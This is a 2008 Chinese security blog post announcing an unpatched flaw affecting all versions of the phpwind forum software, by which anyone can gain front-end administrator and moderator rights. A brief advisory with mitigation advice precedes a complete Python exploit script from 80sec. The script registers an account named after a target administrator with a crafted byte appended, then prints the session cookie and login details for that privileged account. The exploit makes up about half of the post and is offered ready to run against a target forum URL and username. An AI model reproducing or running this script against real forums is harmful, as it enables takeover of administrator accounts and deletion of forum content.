---
title: phpwind 0day 管理权限泄露漏洞 + exploit 利用程序
description: 夜火：最近漏洞多多啊，前2天的Flash0dayexploit生成器下载和dvbbs8.2(access/sql)版login.asp远程注入漏洞刚出来，今天phpwind的管理权限泄露漏洞就出来了漏洞发布：http://www.80sec.com/漏洞作者：jianxin@80sec.com漏洞厂商：http://www.phpwind.com/影响范围：本漏洞目前影响phpwind所有版本危害级别：高漏洞说明：phpwind是国内使用非常广泛的一款程序，由于在程序设计上存在错误，导致任何人可以取得前台管理员及版主权限，做删除帖子等任意操作
date: 2008-06-02 04:10:32
category: 漏洞信息
tags: ['PHPWind', '0day', 'exploit', '漏洞信息']
post_id: 506
alias: phpwind-usertoattack-0day-exploit
ViewNums: 6192
---

[夜火](/blog/)最近[漏洞](/tags/%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF)多多啊，前2天的[Flash 0day exploit生成器 下载](/blog/flash-0day-exploit "flash 0day exploit生成器 下载"和[dvbbs8.2(access/sql)版 login.asp远程注入漏洞](/blog/dvbbs8.2-access-sql-version-login.asp-remote-sql-injection "dvbbs8.2(access/sql版 login.asp远程注入漏洞exploit")刚出来，今天[phpwind](/tags/PHPWind)的管理权限泄露漏洞就出来了

漏洞发布：<http://www.80sec.com/>
漏洞作者：jianxin@80sec.com
漏洞厂商：<http://www.phpwind.com/>
影响范围：本漏洞目前影响phpwind所有版本
危害级别：高
漏洞说明：phpwind是国内使用非常广泛的一款程序，由于在程序设计上存在错误，导致任何人可以取得前台管理员及版主权限，做删除帖子等任意操作

利用方式：www.80sec.com有提供[exploit](/tags/exploit)
漏洞分析：由于phpwind论坛在设计上对数据库存储机制不了解，导致在程序逻辑上判断有问题，用精心构造的数据注册用户即可获得管理权限
漏洞修补：建议关闭注册功能等待官方出补丁
漏洞状态：
08.5.25发现此漏洞
08.6.1由80sec.com公开此漏洞

暂无补丁

原始地址：<http://www.80sec.com/release/phpwind-exploit.txt>

漏洞测试(python)：

`# -*- coding: gb2312 -*-
import urllib2,httplib,sys
httplib.HTTPConnection.debuglevel = 1
cookies = urllib2.HTTPCookieProcessor()
opener = urllib2.build_opener(cookies)

def banner():
    print ""
    print "########################################################"
    print "Phpwind所有版本管理权限泄露漏洞利用poc"
    print "Copyright (C) 2006"
    print "jianxin@80sec.com"
    print "80sec是一个新的致力于web安全的小团体"
    print "http://www.80sec.com"

def usage():
    banner()
    print "Usage:
"
    print "   $ ./phpwind.py pwforumurl usertoattack
"
    print "   pwforumurl 目标论坛地址如http://www.80sec.com/"
    print "   usertoattack 目标拥有权限的斑竹或管理员"
    print "   攻击结果将会在目标论坛注册一个和目标用户一样的帐户"
    print "   最新版本可以使用uid登陆"
    print "   其他版本可以使用cookie+useragent登陆"
    print "########################################################"
    print ""

argvs=sys.argv
usage()

data = "regname=%s%s1&regpwd=@80sec&regpwdrepeat=@80sec&regemail=foo@foo.com&regemailtoall=1&step=2" % (argvs[2],"%c1")
pwurl = "%s/register.php" % argvs[1]

request = urllib2.Request(
url     = pwurl ,
        headers = {'Content-Type' : 'application/x-www-form-urlencoded','User-Agent': '80sec owned this'},
        data    = data)

f=opener.open(request)
headers=f.headers.dict
cookie=headers["set-cookie"]
try:
if cookie.index('winduser'):
print "Exploit Success!"
print "Login with uid password @80sec or Cookie:"
print cookie
print "User-agent: 80sec owned this"
except:
print "Error! http://www.80sec.com"
print "Connect root#80sec.com"`

